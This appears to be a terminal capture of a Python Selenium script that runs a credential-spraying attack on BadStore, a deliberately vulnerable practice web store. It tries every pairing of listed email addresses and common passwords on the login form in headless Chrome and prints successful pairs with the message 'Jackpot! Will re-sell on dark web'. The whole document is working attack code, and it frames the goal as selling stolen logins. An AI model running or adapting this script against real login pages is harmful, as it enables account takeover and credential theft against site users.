ec2-user@kali:~$ cat headless-badstore-cred-spray.py
#!/usr/bin/python

import os
import json
import sys
import time

from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
target = sys.argv[1]
target = target.lower()
print target
if (target.find('badstore') != -1 ):
        print ("Ah ... badstore ... good, good")
else:
        print ("Yikes, I don't see badstore in the target url, this thing is built specifcally for badstore so.... good luck!")

# enable browser logging
d = DesiredCapabilities.CHROME
d['loggingPrefs'] = { 'performance':'ALL' }
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
# import Action chains
from selenium.webdriver import ActionChains

chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.binary_location = '/usr/bin/google-chrome'

driver = webdriver.Chrome(executable_path=os.path.abspath("chromedriver"), chrome_options=chrome_options, service_args=["--verbose", "--log-path=D:\\temp3\\chromedriverxx.log"], desired_capabilities=d)
email_list = ["big@spender.com", "itsbrett@gmail.com", "joe@supplier.com", "julio.tan@gmail.com", "2@2.com"]
passwd_list =["iforgot", "time", "love", "hello123", "money", "please"]
for email in email_list:
        for passwd in passwd_list:
                driver.get(target)
                time.sleep(0.25)
                print(driver.page_source)
                assert "BadStore" in driver.title
                #assert "Python" in driver.title
                # elem = driver.find_element_by_partial_link_text('loginregister')
                #to refresh the browser
                #driver.refresh()
                # identifying the source element
                #source= driver.find_element_by_xpath("//*[text()='username']");
                # action chain object creation
                action = ActionChains(driver)
                # move to the element and click then perform the operation
                #action.move_to_element(elem).click().perform()
                elem = driver.find_element_by_name("email")
                elem.clear()
                elem.send_keys(email)
                elem = driver.find_element_by_name("passwd")
                elem.clear()
                elem.send_keys(passwd)
                elem.send_keys(Keys.RETURN)
                #print(driver.page_source)
                #assert "UserID and Password not found" not in driver.page_source
                if ("UserID and Password not found" in driver.page_source):
                        print email + " " + passwd + " nope"
                else:
                        print "Jackpot! Will re-sell on dark web: " + email + " " + passwd
